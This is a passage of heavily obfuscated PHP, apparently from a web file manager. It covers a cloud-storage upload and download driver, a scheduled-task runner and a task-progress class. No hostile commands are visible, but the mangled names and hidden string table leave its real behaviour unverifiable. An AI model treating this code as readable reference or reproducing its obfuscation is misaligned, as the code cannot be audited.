$º¸İúã–[1582] . $ô¬åó¥å); $”ı‹±¬Ú = $this->ussRequest($éóÒäÈÏ, $º¸İúã–[269], !1, $½„üé€‡); if (!$”ı‹±¬Ú[$º¸İúã–[1300]]) { return !1; } $¬ÃÓ›ãô = $”ı‹±¬Ú[$º¸İúã–[1290]]; $œÍ¨±úÇ = 0; $İÖëÓ¡ = $¬ÃÓ›ãô[$º¸İúã–[1583]]; $¦Œ–ÈÆ = fopen($©Å‚–¼, $º¸İúã–[1459]); if (!$¦Œ–ÈÆ) { return !1; } do { $Í˜¹õ¡ = $¬ÃÓ›ãô[$º¸İúã–[1584]]; fseek_64($¦Œ–ÈÆ, $œÍ¨±úÇ); $·ŸİóØö = fread($¦Œ–ÈÆ, $Í˜¹õ¡); $¥­Àé = 0; do { $¥­Àé++; $¬ÃÓ›ãô = $this->uploadPart($éóÒäÈÏ, $¬ÃÓ›ãô, $·ŸİóØö); } while (!$¬ÃÓ›ãô && $¥­Àé < 3); if (!$¬ÃÓ›ãô) { return !1; } $İÖëÓ¡ = $¬ÃÓ›ãô[$º¸İúã–[1583]]; $œÍ¨±úÇ += $Í˜¹õ¡; } while ($İÖëÓ¡ != -1); fclose($¦Œ–ÈÆ); $½„üé€‡ = array($º¸İúã–[1585], $º¸İúã–[1586] . $¬ÃÓ›ãô[$º¸İúã–[1587]], $º¸İúã–[1581]); $”ı‹±¬Ú = $this->ussRequest($éóÒäÈÏ, $º¸İúã–[269], !1, $½„üé€‡); return $”ı‹±¬Ú[$º¸İúã–[1300]] ? $this->getPathOuter($§êÉûò) : !1; } private function uploadPart($ÆİĞÕ•î, $³¼Ó÷±, &$¼“¼É˜Ğ) { $±œ·³Ğì =& $_SERVER[ÕŸ²ó÷å]; $ø’ö˜ñ« = array($±œ·³Ğì[1588], $±œ·³Ğì[1586] . $³¼Ó÷±[$±œ·³Ğì[1587]], $±œ·³Ğì[1589] . $³¼Ó÷±[$±œ·³Ğì[1583]], $±œ·³Ğì[156] . $³¼Ó÷±[$±œ·³Ğì[1584]]); $™Şøä— = $this->ussRequest($ÆİĞÕ•î, $±œ·³Ğì[269], $¼“¼É˜Ğ, $ø’ö˜ñ«); return !$™Şøä—[$±œ·³Ğì[1300]] ? $™Şøä—[$±œ·³Ğì[1300]] : $™Şøä—[$±œ·³Ğì[1290]]; } public function uploadFormData($Ôãö”âÆ, $’»ªù‰” = 3600) { return $this->uploadPolicy($Ôãö”âÆ, $’»ªù‰”); } public function multiUploadFormData($ş“â¬ÈÊ, $—‡æÅˆ„ = 3600) { $¾ƒâôí =& $_SERVER[ÕŸ²ó÷å]; $ŸÒ”©–à = (int) $GLOBALS[$¾ƒâôí[7]][$¾ƒâôí[89]]; return $this->uploadPolicy($ş“â¬ÈÊ, $—‡æÅˆ„, $ŸÒ”©–à); } private function uploadPolicy($İ—ÑÔ“, $ğ©ÜÏİ = 3600, $©¦‡ÏŸ = 0) { $€—¡ıö =& $_SERVER[ÕŸ²ó÷å]; $€ÀÃ ¨Ó = $€—¡ıö[8] . $this->bucket; $­Ğ€ÎÅš = gmdate($€—¡ıö[1494]); $¡ùï©À¸ = array($€—¡ıö[1590] => $this->bucket, $€—¡ıö[1591] => $İ—ÑÔ“, $€—¡ıö[1592] => time() + $ğ©ÜÏİ, $€—¡ıö[1593] => $­Ğ€ÎÅš); if ($©¦‡ÏŸ) { $¡ùï©À¸[$€—¡ıö[1479]] = $©¦‡ÏŸ; } $¯±–ğå = base64_encode(json_encode($¡ùï©À¸)); $ÄÜÁÜÙ¬ = base64_encode(hash_hmac($€—¡ıö[1547], "\120\x4f\x53\124\46{$€ÀÃ ¨Ó}\46{$­Ğ€ÎÅš}\46{$¯±–ğå}", md5("{$this->userpass}"), !0)); $¬õ¸‹Å› = array($€—¡ıö[302] => $¯±–ğå, $€—¡ıö[1594] => "\x55\x50\131\x55\116\40{$this->username}\x3a{$ÄÜÁÜÙ¬}", $€—¡ıö[218] => $this->endpoint . $€ÀÃ ¨Ó); return $¬õ¸‹Å›; } public function download($”¤´Í¹, $‰´®Û¯) { $âÁÙ­ = IO::getPathInner(IO::mkfile($‰´®Û¯)); if (!($—ŒãØƒ = $this->link($”¤´Í¹))) { return !1; } $½ÄŸ½Îß = 0; $ıÇÔ±ŠÛ = 1024 * 200; $¥›š˜§¦ = fopen($âÁÙ­, $_SERVER[ÕŸ²ó÷å][1542]); while (!0) { $ä¿«ù² = $this->fileSubstr($”¤´Í¹, $½ÄŸ½Îß, $ıÇÔ±ŠÛ); if ($ä¿«ù² === !1) { return !1; } fwrite($¥›š˜§¦, $ä¿«ù²); $½ÄŸ½Îß += $ıÇÔ±ŠÛ; if (strlen($ä¿«ù²) < $ıÇÔ±ŠÛ) { break; } } fclose($¥›š˜§¦); return $‰´®Û¯; } public function link($ÙŞêšáĞ, $ú¾µ Ğ© = array()) { $î‡ş·èÌ =& $_SERVER[ÕŸ²ó÷å]; $ÙŞêšáĞ = trim($ÙŞêšáĞ, $î‡ş·èÌ[8]); if (!empty($this->token)) { $º†Îø„Š = strtotime(date($î‡ş·èÌ[1595])); $İ˜íŸ€ = substr(md5($this->token . $î‡ş·èÌ[369] . $º†Îø„Š . $î‡ş·èÌ[1596] . $ÙŞêšáĞ), 12, 8) . $º†Îø„Š; $ú¾µ Ğ©[] = $î‡ş·èÌ[1597] . $İ˜íŸ€; } $¢«é®İ” = !empty($ú¾µ Ğ©) ? $î‡ş·èÌ[86] . implode($î‡ş·èÌ[369], $ú¾µ Ğ©) : $î‡ş·èÌ[12]; return $this->getHost() . $î‡ş·èÌ[8] . $ÙŞêšáĞ . $¢«é®İ”; } public function fileOut($Ï·Şœë¢, $ĞÑĞÉó = false, $¢Ø¡¬­ = false, $•¦ÅğÊ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($Ï·Şœë¢, $ĞÑĞÉó, $¢Ø¡¬­, $•¦ÅğÊ); } if (!$¢Ø¡¬­) { $¢Ø¡¬­ = $this->pathThis($Ï·Şœë¢); } $ø¡øÕ¡¹ = $ĞÑĞÉó ? array($_SERVER[ÕŸ²ó÷å][1598] . rawurlencode($¢Ø¡¬­)) : array(); $‘‰ü…ùÕ = $this->link($Ï·Şœë¢, $ø¡øÕ¡¹); $this->fileOutLink($‘‰ü…ùÕ); } public function fileOutServer($¬¥§±â‘, $¢ØÄ¯Æ¥ = false, $Ş©óáßá = false, $¿ğ¹É”— = '') { parent::fileOut($¬¥§±â‘, $¢ØÄ¯Æ¥, $Ş©óáßá, $¿ğ¹É”—); } public function fileOutImage($˜ÔÛµğŞ, $üîªÂƒğ = 250) { $§Ô”Úî­ = $this->link($˜ÔÛµğŞ . $_SERVER[ÕŸ²ó÷å][1599] . $üîªÂƒğ); $this->fileOutLink($§Ô”Úî­); } public function fileOutImageServer($íæ÷Û…, $Æõ”èÒ© = 250) { parent::fileOutImage($íæ÷Û…, $Æõ”èÒ©); } public function hashMd5($Š£Áƒ‘) { $ìŠˆèâ¡ =& $_SERVER[ÕŸ²ó÷å]; $Ú¥‚×½‚ = $this->_objectMeta($Š£Áƒ‘); return isset($Ú¥‚×½‚[$ìŠˆèâ¡[255]]) ? $Ú¥‚×½‚[$ìŠˆèâ¡[255]] : !1; } public function size($‹‹öïƒª) { $Ôƒ–Å– = $this->objectMeta($‹‹öïƒª); return $Ôƒ–Å– ? $Ôƒ–Å–[$_SERVER[ÕŸ²ó÷å][89]] : 0; } public function info($®ÀöéÜ°) { if ($this->isFolder($®ÀöéÜ°)) { return $this->folderInfo($®ÀöéÜ°); } else { if ($this->isFile($®ÀöéÜ°)) { return $this->fileInfo($®ÀöéÜ°); } } return !1; } public function exist($©—ÃàØ) { return $this->isFile($©—ÃàØ) || $this->isFolder($©—ÃàØ); } public function isFile($ß³ı”´¼) { return !$this->isFolder($ß³ı”´¼) && $this->objectMeta($ß³ı”´¼); } public function isFolder($âñ¿å) { return $this->cacheMethod($_SERVER[ÕŸ²ó÷å][189], $âñ¿å); } protected function objectMeta($áŠ·»Ÿö) { return $this->cacheMethod($_SERVER[ÕŸ²ó÷å][191], $áŠ·»Ÿö); } protected function _objectMeta($´‚‹šÊÒ) { $Ä€õªÊû =& $_SERVER[ÕŸ²ó÷å]; if ($´‚‹šÊÒ == $Ä€õªÊû[12] || $´‚‹šÊÒ == $Ä€õªÊû[8]) { return array(); } $ª°ŠÙ ú = $this->ussRequest($´‚‹šÊÒ, $Ä€õªÊû[1600]); if (!$ª°ŠÙ ú[$Ä€õªÊû[1300]]) { return null; } $Ğ¬Å¹Ôù = isset($ª°ŠÙ ú[$Ä€õªÊû[1290]]) ? $ª°ŠÙ ú[$Ä€õªÊû[1290]] : array(); if (!isset($Ğ¬Å¹Ôù[$Ä€õªÊû[1601]])) { return null; } $ÆÊÊû‚¬ = array($Ä€õªÊû[33] => isset($Ğ¬Å¹Ôù[$Ä€õªÊû[1601]]) ? $Ğ¬Å¹Ôù[$Ä€õªÊû[1601]] : null, $Ä€õªÊû[89] => isset($Ğ¬Å¹Ôù[$Ä€õªÊû[1602]]) ? $Ğ¬Å¹Ôù[$Ä€õªÊû[1602]] : null, $Ä€õªÊû[255] => isset($Ğ¬Å¹Ôù[$Ä€õªÊû[1603]]) ? $Ğ¬Å¹Ôù[$Ä€õªÊû[1603]] : null, $Ä€õªÊû[1570] => isset($Ğ¬Å¹Ôù[$Ä€õªÊû[1604]]) ? $Ğ¬Å¹Ôù[$Ä€õªÊû[1604]] : null); $ÆÊÊû‚¬[$Ä€õªÊû[1571]] = isset($Ğ¬Å¹Ôù[$Ä€õªÊû[1605]]) ? strtotime($Ğ¬Å¹Ôù[$Ä€õªÊû[1605]]) : $ÆÊÊû‚¬[$Ä€õªÊû[1570]]; return $ÆÊÊû‚¬; } protected function _isFolder($èà¬Ãúè) { $€¼ç¸²³ =& $_SERVER[ÕŸ²ó÷å]; if ($èà¬Ãúè == $€¼ç¸²³[12] || $èà¬Ãúè == $€¼ç¸²³[8]) { return !0; } $´„¤µ÷ = $this->_objectMeta($èà¬Ãúè); return isset($´„¤µ÷[$€¼ç¸²³[33]]) && $´„¤µ÷[$€¼ç¸²³[33]] == $€¼ç¸²³[88] ? !0 : !1; } } goto a¿÷Ôµª‹ƒ; bš«©Ÿ“ËÒ: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $¨œ“”ö =& $_SERVER[ÕŸ²ó÷å]; if (self::valueGet($¨œ“”ö[834]) != $¨œ“”ö[101]) { return; } if (self::valueGet($¨œ“”ö[1723]) == $¨œ“”ö[101]) { $ó€¸‚€Å = self::valueGet($¨œ“”ö[1724]); if (time() - $ó€¸‚€Å > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($¨œ“”ö[1723], $¨œ“”ö[101]); self::log($¨œ“”ö[1725] . ACTION . $¨œ“”ö[1726]); Hook::bind($¨œ“”ö[1727], $¨œ“”ö[1728]); $«€ÛşÛã = 0; while (!0) { self::cacheClear(); if (self::valueGet($¨œ“”ö[834]) != $¨œ“”ö[101]) { self::valueSet($¨œ“”ö[1723], $¨œ“”ö[238]); self::log($¨œ“”ö[1729]); die; } $º÷¡¡¾Ï = time(); if ($º÷¡¡¾Ï - $«€ÛşÛã >= 60) { self::valueSet(array($¨œ“”ö[1723] => $¨œ“”ö[101], $¨œ“”ö[1724] => $º÷¡¡¾Ï)); $«€ÛşÛã = $º÷¡¡¾Ï; } if (!file_exists(USER_SYSTEM . $¨œ“”ö[1730])) { self::valueSet(array($¨œ“”ö[1723] => $¨œ“”ö[238], $¨œ“”ö[834] => $¨œ“”ö[238])); self::log($¨œ“”ö[1731]); die; } $š´ì¦ó = file_get_contents(BASIC_PATH . $¨œ“”ö[1732]); $ˆëÁª«Ì = KOD_VERSION . $¨œ“”ö[10] . KOD_VERSION_BUILD; $°‰üï = match_text($š´ì¦ó, $¨œ“”ö[1733]) . $¨œ“”ö[10] . match_text($š´ì¦ó, $¨œ“”ö[1734]); if ($°‰üï != $ˆëÁª«Ì) { self::restart(); self::log("\163\164\x6f\x70\x65\144\x2e\133\166\145\x72\x73\151\x6f\x6e\40\x75\160\x64\141\164\x65\x3b{$versionNow}\x20\75\76\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $æ˜œÄ¬Ù =& $_SERVER[ÕŸ²ó÷å]; http_close(); $GLOBALS[$æ˜œÄ¬Ù[1735]] = 1; $_SERVER[$æ˜œÄ¬Ù[1736]] = $æ˜œÄ¬Ù[1737]; $_COOKIE = array(); $GLOBALS[$æ˜œÄ¬Ù[1738]] = 1; $GLOBALS[$æ˜œÄ¬Ù[1739]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $¿‚Èûˆ‹ =& $_SERVER[ÕŸ²ó÷å]; http_close(); self::valueSet($¿‚Èûˆ‹[834], $¿‚Èûˆ‹[238]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($¿‚Èûˆ‹[1723] => $¿‚Èûˆ‹[238], $¿‚Èûˆ‹[834] => $¿‚Èûˆ‹[101])); self::log($¿‚Èûˆ‹[1740]); } public static function taskSwitch() { $ÕÓìûÍÓ =& $_SERVER[ÕŸ²ó÷å]; $°Á€ôâ± = self::valueGet($ÕÓìûÍÓ[834]) == $ÕÓìûÍÓ[101] ? $ÕÓìûÍÓ[238] : $ÕÓìûÍÓ[101]; self::valueSet($ÕÓìûÍÓ[834], $°Á€ôâ±); } public static function shutdownEvent() { $„½ÈåÒ‡ =& $_SERVER[ÕŸ²ó÷å]; self::valueSet($„½ÈåÒ‡[1723], $„½ÈåÒ‡[238]); self::log($„½ÈåÒ‡[1741]); } public static function config($ş„èøóö, $¼õÀÁ¡˜) { self::valueSet($_SERVER[ÕŸ²ó÷å][834], $ş„èøóö); } private static function taskRunAll() { $ù»ÄÎÂ½ =& $_SERVER[ÕŸ²ó÷å]; $—öã¢— = timeFloat(); $“†­Åá× = Model($ù»ÄÎÂ½[1742])->listData(); $ƒà¿´€Â = count($“†­Åá×); for ($ßï¶í ÷ = 0; $ßï¶í ÷ < $ƒà¿´€Â; $ßï¶í ÷++) { $úø¤Õßí = $“†­Åá×[$ßï¶í ÷]; if (!$úø¤Õßí[$ù»ÄÎÂ½[484]] || $úø¤Õßí[$ù»ÄÎÂ½[1743]] != $ù»ÄÎÂ½[101]) { continue; } if (!self::taskTimeCheck($úø¤Õßí)) { continue; } self::taskRun($úø¤Õßí); } Hook::trigger($ù»ÄÎÂ½[1744]); self::taskQueueRun($—öã¢—); } private static function taskQueueRun($çŞ‘¶Ò—) { $®Õ²‘¯‹ = 10; while (!0) { $Îßâ¦ğæ = TaskQueue::run(); if ($Îßâ¦ğæ === !1) { break; } if (timeFloat() - $çŞ‘¶Ò— >= $®Õ²‘¯‹) { break; } } } private static function taskTimeCheck($ÛãÀœ€Ñ) { $ëÌõùºà =& $_SERVER[ÕŸ²ó÷å]; $“ÎªÈëœ = json_decode($ÛãÀœ€Ñ[$ëÌõùºà[216]], !0); $˜¸ÃÛ´¿ = intval($ÛãÀœ€Ñ[$ëÌõùºà[1724]]); $Æ™Ğ„ô¯ = strtotime($ëÌõùºà[1745] . $“ÎªÈëœ[$ëÌõùºà[1746]] . $ëÌõùºà[1747]) - strtotime($ëÌõùºà[1748]); $š“Ñçšæ = time() - strtotime(date($ëÌõùºà[1749]) . $ëÌõùºà[1750]); $…÷ÉÃä = $š“Ñçšæ >= $Æ™Ğ„ô¯ && $š“Ñçšæ <= $Æ™Ğ„ô¯ + 3600; switch ($“ÎªÈëœ[$ëÌõùºà[33]]) { case $ëÌõùºà[1751]: if (time() - $˜¸ÃÛ´¿ < 3600 * 24 * 30) { return !1; } if ($“ÎªÈëœ[$ëÌõùºà[1751]] == date($ëÌõùºà[1752]) && $…÷ÉÃä) { return !0; } break; case $ëÌõùºà[1753]: if (time() - $˜¸ÃÛ´¿ < 3600 * 24 * 7) { return !1; } $¹®ó•©ô = date($ëÌõùºà[1754]) == 0 ? 7 : date($ëÌõùºà[1754]); if ($“ÎªÈëœ[$ëÌõùºà[1753]] == $¹®ó•©ô && $…÷ÉÃä) { return !0; } break; case $ëÌõùºà[1746]: if (time() - $˜¸ÃÛ´¿ < 3600 * 24) { return !1; } if ($…÷ÉÃä) { return !0; } break; case $ëÌõùºà[1755]: if (time() - $˜¸ÃÛ´¿ >= floatval($“ÎªÈëœ[$ëÌõùºà[1755]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $©¾şÇ§  =& $_SERVER[ÕŸ²ó÷å]; static $À²÷Œµü = 0; $Œ¢™ç  = 300; if (!$À²÷Œµü) { $À²÷Œµü = time(); } if (time() - $À²÷Œµü < $Œ¢™ç ) { return; } $À²÷Œµü = time(); $Ø£±¦úÉ = Model($©¾şÇ§ [586])->db($©¾şÇ§ [12]); if ($Ø£±¦úÉ) { $Ø£±¦úÉ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($©¾şÇ§ [1756], $©¾şÇ§ [1757]); die; } } public static function taskRun($ô™÷Öã) { $´ŞË³™ =& $_SERVER[ÕŸ²ó÷å]; self::log($´ŞË³™[1758] . $ô™÷Öã[$´ŞË³™[484]] . $´ŞË³™[1759] . $ô™÷Öã[$´ŞË³™[32]] . $´ŞË³™[1760] . $ô™÷Öã[$´ŞË³™[1761]]); Model($´ŞË³™[1742])->run($ô™÷Öã[$´ŞË³™[484]]); $¤Ó÷ = timeFloat(); $µšÍ­´® = $´ŞË³™[12]; switch ($ô™÷Öã[$´ŞË³™[33]]) { case $´ŞË³™[392]: $õ¢³†Öç = url_request($ô™÷Öã[$´ŞË³™[1761]], $´ŞË³™[271], !1, !1, !1, !1, 10); if ($õ¢³†Öç[$´ŞË³™[834]]) { $µšÍ­´® = strlen($õ¢³†Öç[$´ŞË³™[1290]]); } break; case $´ŞË³™[270]: $µšÍ­´® = Hook::apply($ô™÷Öã[$´ŞË³™[1761]]); default: break; } Model($´ŞË³™[1762])->add(array($´ŞË³™[1763] => $´ŞË³™[12], $´ŞË³™[1764] => $´ŞË³™[238], $´ŞË³™[33] => $´ŞË³™[1765] . $ô™÷Öã[$´ŞË³™[484]], $´ŞË³™[1766] => json_encode(array($´ŞË³™[32] => $ô™÷Öã[$´ŞË³™[32]], $´ŞË³™[1767] => timeFloat() - $¤Ó÷, $´ŞË³™[378] => $µšÍ­´®)))); $Š†®’… = $µšÍ­´® ? $´ŞË³™[1768] . $µšÍ­´® : $´ŞË³™[12]; self::log($´ŞË³™[1769] . $ô™÷Öã[$´ŞË³™[484]] . $´ŞË³™[188] . $Š†®’…); return !0; } public static function valueGet($ˆ…øà¾š) { $¥ÛœèáÂ =& $_SERVER[ÕŸ²ó÷å]; $ÜØÊÀ­Ú = $¥ÛœèáÂ[1770]; $ğâÏÂ† = Model($¥ÛœèáÂ[517])->get($ˆ…øà¾š, $ÜØÊÀ­Ú); if (is_null($ğâÏÂ†)) { Model($¥ÛœèáÂ[517])->set($¥ÛœèáÂ[834], $¥ÛœèáÂ[101], $ÜØÊÀ­Ú); Model($¥ÛœèáÂ[517])->set($¥ÛœèáÂ[1723], $¥ÛœèáÂ[238], $ÜØÊÀ­Ú); $ğâÏÂ† = Model($¥ÛœèáÂ[517])->get($ˆ…øà¾š, $ÜØÊÀ­Ú); } return $ğâÏÂ†; } private static function valueSet($Œ©©õµó, $¶˜ÌçÇ = false) { $ÄÎş³™Ê =& $_SERVER[ÕŸ²ó÷å]; $§”ƒ‚ÏÉ = $ÄÎş³™Ê[1771]; CacheLock::lock($§”ƒ‚ÏÉ); $âÜœÙ‹Ó = Model($ÄÎş³™Ê[517])->set($Œ©©õµó, $¶˜ÌçÇ, $ÄÎş³™Ê[1770]); CacheLock::unlock($§”ƒ‚ÏÉ); return $âÜœÙ‹Ó; } protected static function log($¾ŸÈÙú‚) { write_log($¾ŸÈÙú‚, $_SERVER[ÕŸ²ó÷å][1757]); } private static function cacheClear() { $à‘æ«üÓ =& $_SERVER[ÕŸ²ó÷å]; Cache::clearMemory(Model($à‘æ«üÓ[517])->cacheKey($à‘æ«üÓ[1770])); Cache::clearMemory(Model($à‘æ«üÓ[517])->cacheKey($à‘æ«üÓ[1772])); Model($à‘æ«üÓ[1742])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\x6f\x70"; const STATYS_RUNNING = "\x72\x75\x6e\x6e\151\x6e\147"; const STATYS_KILL = "\x6b\x69\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ø³ì÷»¢, $‘Íù º = '', $½ğê”Íæ = 0, $Ÿ‰ûø‡ = '') { $Ì«Ü—ö =& $_SERVER[ÕŸ²ó÷å]; if (self::get($ø³ì÷»¢)) { return; } $this->task = array($Ì«Ü—ö[484] => $ø³ì÷»¢, $Ì«Ü—ö[1773] => USER_ID, $Ì«Ü—ö[1662] => $Ÿ‰ûø‡, $Ì«Ü—ö[535] => $Ì«Ü—ö[12], $Ì«Ü—ö[33] => $‘Íù º, $Ì«Ü—ö[1146] => $Ì«Ü—ö[12], $Ì«Ü—ö[1144] => $½ğê”Íæ, $Ì«Ü—ö[1774] => 0, $Ì«Ü—ö[1775] => 0, $Ì«Ü—ö[1776] => 0, $Ì«Ü—ö[1777] => timeFloat(), $Ì«Ü—ö[1778] => 0, $Ì«Ü—ö[1779] => 0, $Ì«Ü—ö[1780] => 0, $Ì«Ü—ö[1781] => 0, $Ì«Ü—ö[834] => $Ì«Ü—ö[1723]); $GLOBALS[$Ì«Ü—ö[1782]] = 1; Hook::bind($Ì«Ü—ö[1727], array($this, $Ì«Ü—ö[1783])); Hook::bind($Ì«Ü—ö[1784], array($this, $Ì«Ü—ö[1785])); $this->startAfter(); Hook::trigger($Ì«Ü—ö[1786], $this->task); $this->task[$Ì«Ü—ö[1779]] = timeFloat(); } public function end($½«¾óÙ§ = '') { $Î÷Û‘†ˆ =& $_SERVER[ÕŸ²ó÷å]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Î÷Û‘†ˆ[1779]]) { self::valueSet($this->task[$Î÷Û‘†ˆ[484]], !1); } $this->isEnd = !0; if ($½«¾óÙ§) { $this->task[$Î÷Û‘†ˆ[535]] = $½«¾óÙ§; } self::log($Î÷Û‘†ˆ[1787] . $this->task[$Î÷Û‘†ˆ[484]] . $Î÷Û‘†ˆ[1788] . sprintf($Î÷Û‘†ˆ[935], timeFloat() - $this->task[$Î÷Û‘†ˆ[1777]]) . $Î÷Û‘†ˆ[1789]); Hook::unbind($Î÷Û‘†ˆ[1727], array($this, $Î÷Û‘†ˆ[1783])); Hook::unbind($Î÷Û‘†ˆ[1784], array($this, $Î÷Û‘†ˆ[1785])); $this->endAfter(); $ÓÏÃÚº± = $this->task; $this->task = !1; Hook::trigger($Î÷Û‘†ˆ[1790], $ÓÏÃÚº±); } public function update($‹¨‘¤ó = 0, $×™ç­”Ò = false) { $êµŞì“í =& $_SERVER[ÕŸ²ó÷å]; $Õ…”«íº =& $this->task; if (!$Õ…”«íº) { return; } $Õ…”«íº[$êµŞì“í[1774]] += $‹¨‘¤ó; $Õ…”«íº[$êµŞì“í[1778]] = timeFloat(); if ($Õ…”«íº[$êµŞì“í[1144]]) { if ($Õ…”«íº[$êµŞì“í[1144]] < $Õ…”«íº[$êµŞì“í[1774]]) { $Õ…”«íº[$êµŞì“í[1144]] = $Õ…”«íº[$êµŞì“í[1774]]; } $Ü¶Ù°íÓ = timeFloat() - $Õ…”«íº[$êµŞì“í[1777]] - $Õ…”«íº[$êµŞì“í[1780]]; if ($Ü¶Ù°íÓ <= 0) { $Ü¶Ù°íÓ = 0.001; } $Õ…”«íº[$êµŞì“í[1775]] = $Õ…”«íº[$êµŞì“í[1774]] / $Õ…”«íº[$êµŞì“í[1144]]; $Õ…”«íº[$êµŞì“í[1776]] = $Õ…”«íº[$êµŞì“í[1774]] / $Ü¶Ù°íÓ; if ($Õ…”«íº[$êµŞì“í[1775]] > 0) { $Õ…”«íº[$êµŞì“í[1781]] = $Ü¶Ù°íÓ * (1 - $Õ…”«íº[$êµŞì“í[1775]]) / $Õ…”«íº[$êµŞì“í[1775]]; } $Õ…”«íº[$êµŞì“í[1781]] = $Õ…”«íº[$êµŞì“í[1781]] <= 0 ? 0 : $Õ…”«íº[$êµŞì“í[1781]]; } $this->updateAfter(); $ãÊ“êÏÅ = 0.2; if (timeFloat() - $Õ…”«íº[$êµŞì“í[1779]] < $ãÊ“êÏÅ && !$×™ç­”Ò) { return; } $ÔâûÀñ¢ = self::get($Õ…”«íº[$êµŞì“í[484]]); $ö¾ĞÓ½ß = $ÔâûÀñ¢[$êµŞì“í[834]]; if ($ö¾ĞÓ½ß == self::STATYS_KILL) { $­Ù²è¨ = array($êµŞì“í[1791] => LNG($êµŞì“í[1792]), $êµŞì“í[1300] => !1); Cache::set($êµŞì“í[1793] . $this->task[$êµŞì“í[484]], $­Ù²è¨, 30); $this->onKill(); $this->end(); die; } else { if ($ö¾ĞÓ½ß == self::STATYS_STOP) { $øä¦› = 2; $ÔâûÀñ¢[$êµŞì“í[1780]] += $øä¦›; self::valueSet($Õ…”«íº[$êµŞì“í[484]], $ÔâûÀñ¢); sleep($øä¦›); $this->update(); return; } } $Õ…”«íº[$êµŞì“í[834]] = $ö¾ĞÓ½ß ? $ö¾ĞÓ½ß : $Õ…”«íº[$êµŞì“í[834]]; $Õ…”«íº[$êµŞì“í[1780]] = $ÔâûÀñ¢[$êµŞì“í[1780]] ? $ÔâûÀñ¢[$êµŞì“í[1780]] : 0; $Õ…”«íº[$êµŞì“í[1779]] = timeFloat(); Hook::trigger($êµŞì“í[1794], $Õ…”«íº); self::valueSet($Õ…”«íº[$êµŞì“í[484]], $Õ…”«íº); } public function onKillSet($õÆéŠ‰Ş, $Ğ­«©Àº = array()) { $this->onKillCall = array($õÆéŠ‰Ş, $Ğ­«©Àº); } public function onKill() { $¸ÏØ“šì =& $_SERVER[ÕŸ²ó÷å]; self::log($¸ÏØ“šì[1787] . $this->task[$¸ÏØ“šì[484]] . $¸ÏØ“šì[1795]); Hook::trigger($¸ÏØ“šì[1796], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($÷¦˜Õ„) { $Ïé¬…ˆæ =& $_SERVER[ÕŸ²ó÷å]; Cache::set($Ïé¬…ˆæ[1793] . $this->task[$Ïé¬…ˆæ[484]], $÷¦˜Õ„, 60); return $÷¦˜Õ„; } public static function get($¬òôæ•…) { $ Ğ˜š¨ =& $_SERVER[ÕŸ²ó÷å]; $‹ùŒŠô = self::valueGet($¬òôæ•…); if (is_array($‹ùŒŠô) && $‹ùŒŠô[$ Ğ˜š¨[1797]]) { $Ÿ€íû‹ = ActionApply($‹ùŒŠô[$ Ğ˜š¨[1797]], array($‹ùŒŠô)); $‹ùŒŠô = is_array($Ÿ€íû‹) ? $Ÿ€íû‹ : $‹ùŒŠô; } return $‹ùŒŠô; } public static function listData() { $Ìé²…®â = self::valueGet(); return array_sort_by($Ìé²…®â, $_SERVER[ÕŸ²ó÷å][1777], !0); } public static function kill($ìİ°ü¶) { return self::changeStatus($ìİ°ü¶, self::STATYS_KILL); } public static function stop($œ½âµ ) { return self::changeStatus($œ½âµ , self::STATYS_STOP); } public static function restart($Ï’Ñšß­) { return self::changeStatus($Ï’Ñšß­, self::STATYS_RUNNING); } public static function killAll() { $şãøŒ·„ =& $_SERVER[ÕŸ²ó÷å]; $» ×†‡¾ = self::listData(); foreach ($» ×†‡¾ as $ÓŞÛ‹¬) { self::kill($ÓŞÛ‹¬[$şãøŒ·„[484]]); } sleep(2); foreach ($» ×†‡¾ as $ÓŞÛ‹¬) { self::valueSet($ÓŞÛ‹¬[$şãøŒ·„[484]], !1); } } private static function changeStatus($Ÿ¾”áÁ, $Öç®«àû) { $èÆŞá¤ =& $_SERVER[ÕŸ²ó÷å]; $®¤ÊÜËª = self::valueGet($Ÿ¾”áÁ); if (!$®¤ÊÜËª) { return !1; } $®¤ÊÜËª[$èÆŞá¤[834]] = $Öç®«àû; self::valueSet($Ÿ¾”áÁ, $®¤ÊÜËª); self::log($èÆŞá¤[1798] . $®¤ÊÜËª[$èÆŞá¤[484]] . $èÆŞá¤[1799] . $Öç®«àû); return !0; } public static function valueGet($ïÎƒËü¢ = false) { $¹íĞ€µ‘ =& $_SERVER[ÕŸ²ó÷å]; if ($ïÎƒËü¢) { $ÖÓùëüŒ = Model($¹íĞ€µ‘[529])->where(array($¹íĞ€µ‘[107] => $ïÎƒËü¢, $¹íĞ€µ‘[33] => $¹íĞ€µ‘[1153]))->find(); return $ÖÓùëüŒ ? json_decode($ÖÓùëüŒ[$¹íĞ€µ‘[459]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Ã½ğùé = false) { $›èõïåÇ =& $_SERVER[ÕŸ²ó÷å]; $åÜÛÏ‹Š = array($›èõïåÇ[33] => $›èõïåÇ[1153]); if ($Ã½ğùé) { $åÜÛÏ‹Š[$›èõïåÇ[1773]] = $Ã½ğùé; } $ƒ¤˜ÉÀÇ = Model($›èõïåÇ[529])->where($åÜÛÏ‹Š)->select(); $ƒ¤˜ÉÀÇ = $ƒ¤˜ÉÀÇ ? $ƒ¤˜ÉÀÇ : array(); foreach ($ƒ¤˜ÉÀÇ as $ÌãÊªÖ” => $Û« îÙ) { $ƒ¤˜ÉÀÇ[$ÌãÊªÖ”] = json_decode($Û« îÙ[$›èõïåÇ[459]], !0); } return 